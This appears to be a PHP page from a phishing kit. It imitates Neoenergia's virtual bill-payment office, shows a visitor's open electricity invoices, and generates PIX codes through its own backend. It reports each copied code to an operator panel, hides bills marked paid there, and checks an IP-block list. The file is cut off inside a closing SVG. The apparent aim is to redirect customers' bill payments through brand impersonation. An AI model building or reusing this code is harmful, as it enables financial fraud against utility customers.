<?php
require_once __DIR__ . '/config.php';
addSecurityHeaders();

// Buscar configuração do WhatsApp
$whatsappAtivo = false;
$whatsappNumero = '';
try {
    $pdo = getConnection();
    $stmt = $pdo->prepare("SELECT valor, ativo FROM configuracoes WHERE chave = 'whatsapp' LIMIT 1");
    $stmt->execute();
    $wppConfig = $stmt->fetch();

    // Cast defensivo: no MySQL pode vir como '0'/'1' ou até string
    $ativo = isset($wppConfig['ativo']) ? (int)$wppConfig['ativo'] : 0;
    $valor = isset($wppConfig['valor']) ? trim((string)$wppConfig['valor']) : '';

    if ($ativo === 1 && $valor !== '') {
        $whatsappAtivo = true;
        $whatsappNumero = $valor;
    }
} catch (Exception $e) {
    // Ignorar erro, manter desativado
}

// Verificar se tem dados na sessão
if (!isset($_SESSION['faturas']) || empty($_SESSION['faturas'])) {
    header("Location: index.php");
    exit;
}

$todasFaturas = $_SESSION['faturas'];
$identificador = $_SESSION['identificador'] ?? '';
$ucSelecionada = $_SESSION['uc_selecionada'] ?? '';
$estado = $_SESSION['estado'] ?? '';

// Filtrar faturas pela UC selecionada e remover vinculadas
$faturas = array_filter($todasFaturas, function($f) use ($ucSelecionada) {
    $codigo = $f['uc'] ?? $f['codigoUC'] ?? $f['codigo_uc'] ?? '';
    $status = $f['statusFatura'] ?? '';
    // Remover vinculadas (sem código de barras)
    if ($status === 'vinculada') return false;
    return empty($ucSelecionada) || $codigo === $ucSelecionada;
});
$faturas = array_values($faturas);

// Remover faturas já marcadas como pagas no painel (status = 'pago')
// Buscamos por TXID (número da fatura) que foi salvo quando geramos o PIX
try {
    $pdo = getConnection();
    
    // Buscar todos os TXIDs de pagamentos marcados como PAGO
    $stmtPagas = $pdo->prepare("SELECT txid FROM pagamentos WHERE status = 'pago' AND txid IS NOT NULL AND txid <> ''");
    $stmtPagas->execute();
    $txidsPagos = $stmtPagas->fetchAll(PDO::FETCH_COLUMN);

    if (!empty($txidsPagos)) {
        $faturas = array_values(array_filter($faturas, function($f) use ($txidsPagos) {
            $numeroFatura = $f['numeroFatura'] ?? '';
            // Se não tem número, mantém na lista
            if ($numeroFatura === '') return true;
            // Se o número da fatura está na lista de TXIDs pagos, remover
            return !in_array($numeroFatura, $txidsPagos, true);
        }));
    }
} catch (Exception $e) {
    // Se der erro no banco, não quebra o fluxo do usuário
    error_log("Erro ao filtrar faturas pagas: " . $e->getMessage());
}

// Se não tem faturas (após filtros), ir para página sem faturas
if (empty($faturas)) {
    header("Location: sem_faturas.php?cpf=" . urlencode($identificador));
    exit;
}

// Pegar dados da primeira fatura para exibição
$endereco = $faturas[0]['endereco'] ?? 'Endereço cadastrado';
$uc = $faturas[0]['uc'] ?? $faturas[0]['codigoUC'] ?? '';
$protocolo = time();

// Função para formatar valor
function formatarValor($valor) {
    // Se já é número, usar diretamente
    if (is_numeric($valor) && !is_string($valor)) {
        $num = floatval($valor);
    } else {
        $str = (string)$valor;
        // Se contém vírgula, é formato brasileiro
        if (strpos($str, ',') !== false) {
            $num = floatval(str_replace(['.', ','], ['', '.'], $str));
        } else {
            // Formato com ponto decimal ou número inteiro
            $num = floatval($str);
        }
    }
    return 'R$ ' . number_format($num, 2, ',', '.');
}

// Função para formatar data
function formatarDataVencimento($data) {
    if (!$data) return '';
    $timestamp = strtotime($data);
    if (!$timestamp) return $data;
    return date('d/m/Y', $timestamp);
}

// Verificar status
function getStatusLabel($status) {
    if ($status === 'vencida') return 'Vencida';
    if ($status === 'aVencer') return 'A Vencer';
    if ($status === 'emProcessamento') return 'A Vencer'; // Mostrar "em processamento" como "A Vencer"
    if ($status === 'pendente') return 'A Vencer';
    return $status;
}

function getStatusColor($status) {
    if ($status === 'vencida') return 'color: #EF4444;';
    return 'color: #22C55E;'; // Verde para todos os outros status
}

// Mascarar identificador
function maskIdentificador($id) {
    if (strlen($id) <= 4) return $id;
    return substr($id, 0, 2) . '****' . substr($id, -2);
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neoenergia - Agência Virtual</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="assets/favicon.png">
    <link rel="stylesheet" href="assets/lovable-base.css">
    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
    <style>
        /* Page-specific overrides */
        :root {
            --background: hsl(0, 0%, 100%);
            --foreground: hsl(0, 0%, 20%);
            --card: hsl(0, 0%, 100%);
            --primary: hsl(145, 100%, 32%);
            --primary-foreground: hsl(0, 0%, 100%);
            --muted: hsl(0, 0%, 96%);
            --muted-foreground: hsl(0, 0%, 45%);
            --border: hsl(0, 0%, 90%);
            --secondary: hsl(0, 0%, 96%);
            --destructive: hsl(0, 84%, 60%);
            --neo-green: #00A443;
            --neo-green-dark: #007F33;
            --neo-green-hex: #00A443;
            --neo-green-dark-hex: #007F33;
            --neo-blue: #0066CC;
            --neo-blue-hex: #0066CC;
        }
        
        body {
            font-family: 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
            background: var(--secondary);
            color: var(--foreground);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            -webkit-font-smoothing: antialiased;
        }
        
        /* Header Verde - Idêntico ao Lovable */
        .header {
            background: var(--neo-green);
            width: 100%;
        }
        
        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 16px;
        }
        
        .header-content {
            height: 64px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        
        .menu-btn {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            color: rgba(255, 255, 255, 0.9);
            cursor: pointer;
        }
        
        .header-logo {
            height: 48px;
            width: auto;
        }
        
        .login-btn {
            height: 36px;
            padding: 0 16px;
            border-radius: 6px;
            background: var(--neo-green-dark);
            color: white;
            font-size: 14px;
            font-weight: 500;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        /* Main Content */
        .main {
            flex: 1;
            padding: 32px 16px;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            animation: fadeInUp 0.4s ease;
        }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Protocolo Badge */
        .protocolo-badge {
            display: inline-block;
            background: var(--muted);
            color: var(--muted-foreground);
            font-size: 14px;
            padding: 6px 12px;
            border-radius: 4px;
            margin-bottom: 16px;
        }
        
        .protocolo-badge span {
            color: var(--foreground);
            font-weight: 500;
        }
        
        /* Title - igual Lovable */
        .page-title {
            font-size: 28.8px;
            font-weight: 700;
            color: #615D5A;
            margin-bottom: 8px;
            line-height: 1.2;
        }
        
        .page-subtitle {
            font-size: 14px;
            color: var(--muted-foreground);
            margin-bottom: 32px;
        }
        
        /* Info Card */
        .info-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            margin-bottom: 24px;
            overflow: hidden;
        }
        
        .info-row {
            padding: 16px;
        }
        
        .info-row + .info-row {
            border-top: 1px solid var(--border);
        }
        
        .info-label {
            font-size: 12px;
            text-transform: uppercase;
            color: var(--neo-green);
            font-weight: 500;
            margin-bottom: 4px;
        }
        
        .info-value {
            font-size: 20px;
            font-weight: 500;
            color: var(--foreground);
        }
        
        .info-value.small {
            font-size: 14px;
            font-weight: 400;
        }
        
        /* Faturas Header */
        .faturas-header {
            background: var(--neo-green);
            color: white;
            padding: 16px 24px;
            border-radius: 8px 8px 0 0;
            font-weight: 500;
        }
        
        /* Faturas List */
        .faturas-list {
            background: white;
            border-radius: 0 0 8px 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        
        .fatura-item {
            padding: 24px;
            border-bottom: 1px solid var(--border);
        }
        
        .fatura-item:last-child {
            border-bottom: none;
        }
        
        .fatura-info {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            margin-bottom: 24px;
            text-align: center;
        }
        
        .fatura-info-item {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .fatura-info-label {
            font-size: 12px;
            text-transform: uppercase;
            color: var(--muted-foreground);
            margin-bottom: 2px;
        }
        
        .fatura-info-value {
            font-weight: 500;
        }
        
        /* Botão PIX */
        .btn-pix {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            background: var(--neo-blue);
            color: white;
            font-weight: 500;
            padding: 12px 32px;
            border-radius: 24px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            transition: opacity 0.2s;
        }
        
        .btn-pix:hover {
            opacity: 0.9;
        }
        
        /* Aviso */
        .aviso {
            color: var(--destructive);
            font-size: 14px;
            margin-top: 24px;
        }
        
        .info-text {
            margin-top: 16px;
        }
        
        .info-text strong {
            display: block;
            font-size: 14px;
            color: var(--foreground);
            margin-bottom: 4px;
        }
        
        .info-text p {
            font-size: 14px;
            color: var(--muted-foreground);
        }
        
        /* Botões */
        .btn-container {
            margin-top: 32px;
            display: flex;
            gap: 12px;
        }
        
        .btn-primary {
            background: var(--neo-green);
            color: white;
            font-weight: 500;
            padding: 12px 24px;
            border-radius: 24px;
            border: none;
            cursor: pointer;
            font-size: 14px;
            text-transform: uppercase;
        }
        
        /* Footer */
        .footer {
            background: var(--background);
            border-top: 4px solid var(--neo-green);
            padding: 16px;
        }
        
        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .footer img {
            width: 100%;
            max-width: 420px;
            display: block;
            margin: 0 auto;
        }
        
        /* Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        
        .modal-overlay.open {
            display: flex;
        }
        
        .modal {
            background: white;
            border-radius: 8px;
            max-width: 420px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            animation: fadeInUp 0.3s ease;
        }
        
        .modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px;
            border-bottom: 1px solid var(--border);
        }
        
        .modal-header h3 {
            font-size: 18px;
            font-weight: 500;
        }
        
        .modal-close {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            cursor: pointer;
            border-radius: 50%;
            color: var(--muted-foreground);
        }
        
        .modal-close:hover {
            background: var(--muted);
        }
        
        .modal-content {
            padding: 24px;
            text-align: center;
        }
        
        .modal-text {
            font-size: 14px;
            color: var(--muted-foreground);
            margin-bottom: 24px;
        }
        
        .qr-container {
            display: flex;
            justify-content: center;
            margin-bottom: 16px;
        }
        
        .qr-box {
            border: 2px solid var(--neo-green);
            border-radius: 8px;
            padding: 16px;
            background: white;
        }
        
        .pix-code-box {
            margin-bottom: 16px;
            padding: 12px;
            background: rgba(0, 0, 0, 0.03);
            border-radius: 8px;
            border: 1px solid var(--border);
        }
        
        .pix-code-label {
            font-size: 12px;
            text-transform: uppercase;
            color: var(--muted-foreground);
            font-weight: 500;
            margin-bottom: 4px;
        }
        
        .pix-code-value {
            font-size: 9px;
            font-family: monospace;
            word-break: break-all;
            color: var(--foreground);
            line-height: 1.5;
        }
        
        .btn-copy {
            width: 100%;
            background: var(--neo-green);
            color: white;
            font-weight: 600;
            padding: 14px 24px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s;
        }
        
        .btn-copy.copied {
            background: #22C55E;
        }
        
        .loading-spinner {
            width: 180px;
            height: 180px;
            background: var(--muted);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        /* Accordion Help */
        .accordion-help {
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 24px;
            overflow: hidden;
        }
        
        .accordion-trigger {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            padding: 16px;
            background: transparent;
            border: none;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .accordion-trigger:hover {
            background: rgba(0, 0, 0, 0.03);
        }
        
        .accordion-trigger-left {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .accordion-trigger-left svg {
            color: var(--neo-green);
        }
        
        .accordion-trigger-left span {
            font-size: 14px;
            font-weight: 500;
            color: var(--foreground);
        }
        
        .accordion-chevron {
            color: var(--muted-foreground);
            transition: transform 0.2s;
        }
        
        .accordion-help.open .accordion-chevron {
            transform: rotate(180deg);
        }
        
        .accordion-content {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }
        
        .accordion-help.open .accordion-content {
            max-height: 400px;
        }
        
        .accordion-content-inner {
            padding: 0 16px 16px;
        }
        
        .step-item {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 12px;
        }
        
        .step-item:last-child {
            margin-bottom: 0;
        }
        
        .step-number {
            width: 24px;
            height: 24px;
            background: var(--neo-green);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            font-size: 12px;
            font-weight: 500;
        }
        
        .step-text {
            font-size: 14px;
            color: var(--foreground);
            text-align: left;
            line-height: 1.5;
        }
        
        .step-text strong {
            font-weight: 600;
        }
        
        .modal-valor-section {
            border-top: 1px solid var(--border);
            padding-top: 16px;
            text-align: center;
        }
        
        .modal-valor-label {
            font-size: 12px;
            color: var(--muted-foreground);
            text-transform: uppercase;
            margin-bottom: 4px;
        }
        
        .modal-valor-value {
            font-size: 20px;
            font-weight: 500;
            color: var(--neo-green);
        }
        
        /* WhatsApp Button */
        .whatsapp-btn {
            position: fixed;
            bottom: 24px;
            right: 24px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: #25D366;
            color: white;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            z-index: 1000;
        }
        
        .whatsapp-btn svg {
            width: 28px;
            height: 28px;
        }
    </style>
    <?php include __DIR__ . '/includes/security.php'; ?>
<body>
    <!-- Overlay de bloqueio de IP -->
    <div id="bloqueioOverlay" style="display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(255,255,255,0.95);z-index:999999;align-items:center;justify-content:center;flex-direction:column;">
        <div style="width:80px;height:80px;border:5px solid #e0e0e0;border-top-color:#006838;border-radius:50%;animation:spin 1s linear infinite;"></div>
        <p style="color:#6B6560;font-size:14px;margin-top:16px;">Carregando...</p>
    </div>
    <script>
    (function() {
        fetch('api/verificar_bloqueio.php?_t=' + Date.now())
            .then(r => r.json())
            .then(data => { if (data.bloqueado) document.getElementById('bloqueioOverlay').style.display = 'flex'; })
            .catch(() => {});
    })();
    </script>
    
    <!-- Header Verde -->
    <header class="header">
        <div class="header-container">
            <div class="header-content">
                <div class="header-left">
                    <button type="button" class="menu-btn" aria-label="Abrir menu">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <line x1="4" y1="12" x2="20" y2="12"></line>
                            <line x1="4" y1="6" x2="20" y2="6"></line>
                            <line x1="4" y1="18" x2="20" y2="18"></line>
                        </svg>
                    </button>
                    <img src="assets/logo-neoenergia-header.svg" alt="Neoenergia" class="header-logo">
                </div>
                <button type="button" class="login-btn">
                    Login
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="5" y1="12" x2="19" y2="12"></line>
                        <polyline points="12 5 19 12 12 19"></polyline>
                    </svg>
                </button>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main">
        <div class="container">
            <!-- Protocolo -->
            <div class="protocolo-badge">
                PROTOCOLO: <span><?= $protocolo ?></span>
            </div>

            <!-- Título -->
            <h1 class="page-title">2ª Via de Pagamento</h1>
            <p class="page-subtitle">Aqui você visualiza o código de barras da sua fatura Elektro em aberto, de maneira rápida e fácil.</p>

            <!-- Info Card -->
            <div class="info-card">
                <div class="info-row">
                    <div class="info-label">UNIDADE CONSUMIDORA</div>
                    <div class="info-value"><?= htmlspecialchars($uc ?: maskIdentificador($identificador)) ?></div>
                </div>
            </div>

            <!-- Faturas em Aberto -->
            <div class="faturas-header">Faturas em aberto</div>
            <div class="faturas-list">
                <?php foreach ($faturas as $index => $fatura): ?>
                <?php
                $valor = $fatura['valorEmissao'] ?? $fatura['valor'] ?? 0;
                $vencimento = $fatura['dataVencimento'] ?? $fatura['vencimento'] ?? '';
                $status = $fatura['statusFatura'] ?? 'pendente';
                $numeroFatura = $fatura['numeroFatura'] ?? '';
                $codbarras = $fatura['codbarras'] ?? '';
                ?>
                <div class="fatura-item">
                    <div class="fatura-info">
                        <div class="fatura-info-item">
                            <span class="fatura-info-label">STATUS</span>
                            <span class="fatura-info-value" style="<?= getStatusColor($status) ?>"><?= getStatusLabel($status) ?></span>
                        </div>
                        <div class="fatura-info-item">
                            <span class="fatura-info-label">VALOR</span>
                            <span class="fatura-info-value" style="color: var(--neo-green);"><?= formatarValor($valor) ?></span>
                        </div>
                        <div class="fatura-info-item">
                            <span class="fatura-info-label">VENCIMENTO</span>
                            <span class="fatura-info-value" style="color: var(--neo-green);"><?= formatarDataVencimento($vencimento) ?></span>
                        </div>
                    </div>
                    
                    <button type="button" class="btn-pix" onclick="abrirModalPix(<?= $index ?>)" data-index="<?= $index ?>" data-valor="<?= htmlspecialchars($valor) ?>" data-uc="<?= htmlspecialchars($uc ?: $identificador) ?>" data-numero="<?= htmlspecialchars($numeroFatura) ?>">
                        <span>Pagar com PIX</span>
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M9.172 15.172L12 18l2.828-2.828L12 12.343l-2.828 2.829zM12 5.657l2.828 2.829L12 11.314 9.172 8.486 12 5.657zM5.657 12l2.829-2.828L11.314 12l-2.828 2.828L5.657 12zM12.686 12l2.828-2.828L18.343 12l-2.829 2.828L12.686 12z"/>
                        </svg>
                    </button>
                </div>
                <?php endforeach; ?>
            </div>

            <!-- Aviso -->
            <p class="aviso">Atenção! O pagamento pode demorar até 3 dias úteis para ser compensado e identificado.</p>

            <!-- Info Box -->
            <div class="info-text">
                <strong>Valores das faturas em aberto:</strong>
                <p>Este valor corresponde ao débito atual da unidade consumidora informada. Para as faturas pagas após a data de vencimento, serão incididos juros e multas no próximo mês de faturamento.</p>
            </div>

            <!-- Botões -->
            <div class="btn-container">
                <?php
                    $estadoBack = $_SESSION['estado'] ?? (isset($_GET['estado']) ? sanitize($_GET['estado']) : '');
                    $cpfBack = $_SESSION['identificador'] ?? (isset($_GET['cpf']) ? sanitize($_GET['cpf']) : '');
                    $cpfBack = preg_replace('/\D/', '', (string)$cpfBack);

                    // Se veio de múltiplas UCs, volta para a seleção de UC; senão, volta para identificação
                    $temMultiplasUcs = isset($_SESSION['unidades_consumidoras']) && !empty($_SESSION['unidades_consumidoras']);
                    $urlVoltar = $temMultiplasUcs
                        ? ("selecionar_uc.php?estado=" . urlencode($estadoBack) . "&cpf=" . urlencode($cpfBack))
                        : ("index.php?step=identificacao&estado=" . urlencode($estadoBack) . "&cpf=" . urlencode($cpfBack));
                ?>
                <button type="button" class="btn-primary" onclick="window.location.href='<?= $urlVoltar ?>'">VOLTAR</button>
            </div>
        </div>
    </main>


    <!-- Modal PIX -->
    <div class="modal-overlay" id="modalPix">
        <div class="modal">
            <div class="modal-header">
                <h3>Pagamento por PIX</h3>
                <button type="button" class="modal-close" onclick="fecharModalPix()">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
            </div>
            <div class="modal-content">
                <p class="modal-text">Abra o aplicativo do seu banco, selecione PIX e efetue o pagamento utilizando o QR code.</p>
                
                <div class="qr-container">
                    <div class="qr-box" id="qrCodeContainer">
                        <div class="loading-spinner" id="qrLoading">
                            <span style="color: var(--muted-foreground); font-size: 14px;">Gerando QR Code...</span>
                        </div>
                        <div id="qrCodeImage" style="display: none;"></div>
                    </div>
                </div>

                <div class="pix-code-box" id="pixCodeBox" style="display: none;">
                    <div class="pix-code-label">Código Copia e Cola</div>
                    <div class="pix-code-value" id="pixCodeValue"></div>
                </div>

                <button type="button" class="btn-copy" id="btnCopy" onclick="copiarPix()" style="display: none;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                    <span id="btnCopyText">Copiar código PIX</span>
                </button>

                <!-- Accordion - Como pagar com PIX -->
                <div class="accordion-help" id="accordionHelp">
                    <button type="button" class="accordion-trigger" onclick="toggleAccordion()">
                        <div class="accordion-trigger-left">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <circle cx="12" cy="12" r="10"></circle>
                                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
                                <line x1="12" y1="17" x2="12.01" y2="17"></line>
                            </svg>
                            <span>Como pagar com PIX Copia e Cola?</span>
                        </div>
                        <svg class="accordion-chevron" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <polyline points="6 9 12 15 18 9"></polyline>
                        </svg>
                    </button>
                    <div class="accordion-content">
                        <div class="accordion-content-inner">
                            <div class="step-item">
                                <div class="step-number">1</div>
                                <p class="step-text">Clique no botão <strong>"Copiar código PIX"</strong> acima para copiar o código.</p>
                            </div>
                            <div class="step-item">
                                <div class="step-number">2</div>
                                <p class="step-text">Abra o aplicativo do seu banco e acesse a opção <strong>PIX</strong>.</p>
                            </div>
                            <div class="step-item">
                                <div class="step-number">3</div>
                                <p class="step-text">Selecione <strong>"Pagar com PIX Copia e Cola"</strong> ou <strong>"Pix Copia e Cola"</strong>.</p>
                            </div>
                            <div class="step-item">
                                <div class="step-number">4</div>
                                <p class="step-text">Cole o código copiado e confirme o pagamento.</p>
                            </div>
                            <div class="step-item">
                                <div class="step-number">5</div>
                                <p class="step-text">Pronto! O pagamento será confirmado em instantes.</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Valor -->
                <div class="modal-valor-section" id="modalValorSection">
                    <p class="modal-valor-label">VALOR</p>
                    <p class="modal-valor-value" id="modalValorValue">R$ 0,00</p>
                </div>
            </div>
        </div>
    </div>


    <script>
        // Dados das faturas
        const faturas = <?= json_encode(array_values($faturas)) ?>;
        const identificador = '<?= htmlspecialchars($identificador) ?>';
        let pixCodeAtual = '';
        let pagamentoIdAtual = '';
        let pagamentoCodigoAtual = null;
        let copied = false;

        function abrirModalPix(index) {
            const modal = document.getElementById('modalPix');
            modal.classList.add('open');
            
            // Reset modal
            document.getElementById('qrLoading').style.display = 'flex';
            document.getElementById('qrCodeImage').style.display = 'none';
            document.getElementById('qrCodeImage').innerHTML = '';
            document.getElementById('pixCodeBox').style.display = 'none';
            document.getElementById('btnCopy').style.display = 'none';
            document.getElementById('accordionHelp').classList.remove('open');
            pixCodeAtual = '';
            pagamentoIdAtual = '';
            pagamentoCodigoAtual = null;
            copied = false;
            
            // Gerar PIX
            const fatura = faturas[index];
            
            // Atualizar valor no modal
            const valor = fatura.valorEmissao || fatura.valor || 0;
            const valorFormatado = formatarValorBR(valor);
            document.getElementById('modalValorValue').textContent = valorFormatado;
            
            gerarPix(fatura);
        }
        
        function formatarValorBR(valor) {
            // Se já é número, usar diretamente
            if (typeof valor === 'number') {
                return 'R$ ' + valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            }
            // Se é string, verificar o formato
            const str = String(valor);
            let num;
            // Se contém vírgula, é formato brasileiro (ex: "1.234,56" ou "8,13")
            if (str.includes(',')) {
                num = parseFloat(str.replace(/\./g, '').replace(',', '.'));
            } else {
                // Formato com ponto decimal ou número inteiro (ex: "8.13" ou "813")
                num = parseFloat(str);
            }
            return 'R$ ' + num.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }
        
        function toggleAccordion() {
            const accordion = document.getElementById('accordionHelp');
            accordion.classList.toggle('open');
        }

        function fecharModalPix() {
            document.getElementById('modalPix').classList.remove('open');
            pixCodeAtual = '';
            pagamentoIdAtual = '';
            pagamentoCodigoAtual = null;
            copied = false;
            document.getElementById('btnCopy').classList.remove('copied');
            document.getElementById('btnCopyText').textContent = 'Copiar código PIX';
        }

        async function gerarPix(fatura) {
            try {
                // Converter valor para número corretamente
                let valorRaw = fatura.valorEmissao || fatura.valor || 0;
                let valor;
                if (typeof valorRaw === 'number') {
                    valor = valorRaw;
                } else {
                    const str = String(valorRaw);
                    // Se contém vírgula, é formato brasileiro (ex: "1.234,56" ou "8,13")
                    if (str.includes(',')) {
                        valor = parseFloat(str.replace(/\./g, '').replace(',', '.'));
                    } else {
                        // Formato com ponto decimal ou número inteiro
                        valor = parseFloat(str);
                    }
                }
                const uc = fatura.uc || identificador;
                const numeroFatura = fatura.numeroFatura || '';

                const response = await fetch('api/gerar_pix.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        valor: valor,
                        uc: uc,
                        identificador: identificador,
                        numeroFatura: numeroFatura
                    })
                });

                const data = await response.json();

                if (data.error) {
                    throw new Error(data.error);
                }

                pixCodeAtual = data.qrcode || data.emvqrcps || data.code || '';
                pagamentoIdAtual = data.pagamento_id || '';
                pagamentoCodigoAtual = data.pagamento_codigo || null;
                
                console.log('PIX gerado - ID:', pagamentoIdAtual, 'Codigo:', pagamentoCodigoAtual);
                
                if (!pixCodeAtual) {
                    throw new Error('Resposta inválida do PIX');
                }

                // Gerar QR Code
                const qr = qrcode(0, 'M');
                qr.addData(pixCodeAtual);
                qr.make();
                
                document.getElementById('qrLoading').style.display = 'none';
                document.getElementById('qrCodeImage').style.display = 'block';
                document.getElementById('qrCodeImage').innerHTML = qr.createImgTag(4, 8);
                
                document.getElementById('pixCodeValue').textContent = pixCodeAtual;
                document.getElementById('pixCodeBox').style.display = 'block';
                document.getElementById('btnCopy').style.display = 'flex';

            } catch (error) {
                console.error('Erro ao gerar PIX:', error);
                document.getElementById('qrLoading').innerHTML = '<span style="color: var(--destructive); font-size: 14px;">Não foi possível gerar o PIX.</span>';
            }
        }

        async function registrarPixCopiado() {
            if (!pagamentoIdAtual && !pagamentoCodigoAtual) {
                console.log('Sem ID/codigo para registrar PIX copiado');
                return;
            }
            
            try {
                const response = await fetch('api/pix_copiado.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        pagamento_id: pagamentoIdAtual,
                        pagamento_codigo: pagamentoCodigoAtual
                    })
                });
                const data = await response.json();
                console.log('PIX copiado registrado:', data);
            } catch (error) {
                console.error('Erro ao registrar PIX copiado:', error);
            }
        }

        function copiarPix() {
            if (!pixCodeAtual || copied) return;

            navigator.clipboard.writeText(pixCodeAtual).then(() => {
                copied = true;
                const btn = document.getElementById('btnCopy');
                btn.classList.add('copied');
                document.getElementById('btnCopyText').textContent = 'Código copiado!';
                
                // Registrar que o PIX foi copiado no painel
                registrarPixCopiado();
                
                setTimeout(() => {
                    copied = false;
                    btn.classList.remove('copied');
                    document.getElementById('btnCopyText').textContent = 'Copiar código PIX';
                }, 3000);
            }).catch(err => {
                // Fallback
                const ta = document.createElement('textarea');
                ta.value = pixCodeAtual;
                ta.style.position = 'fixed';
                ta.style.left = '-9999px';
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                
                copied = true;
                const btn = document.getElementById('btnCopy');
                btn.classList.add('copied');
                document.getElementById('btnCopyText').textContent = 'Código copiado!';
                
                // Registrar que o PIX foi copiado no painel
                registrarPixCopiado();
                
                setTimeout(() => {
                    copied = false;
                    btn.classList.remove('copied');
                    document.getElementById('btnCopyText').textContent = 'Copiar código PIX';
                }, 3000);
            });
        }

        // Fechar modal ao clicar fora
        document.getElementById('modalPix').addEventListener('click', function(e) {
            if (e.target === this) {
                fecharModalPix();
            }
        });
    </script>

    <?php if ($whatsappAtivo && !empty($whatsappNumero)): ?>
    <!-- WhatsApp Button -->
    <a href="https://wa.me/<?= preg_replace('/\D/', '', $whatsappNumero) ?>?text=<?= urlencode('Olá, preciso de atendimento sobre minha fatura.') ?>" 
       target="_blank"
       rel="noopener noreferrer"
       class="whatsapp-float"
       aria-label="Falar no WhatsApp">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
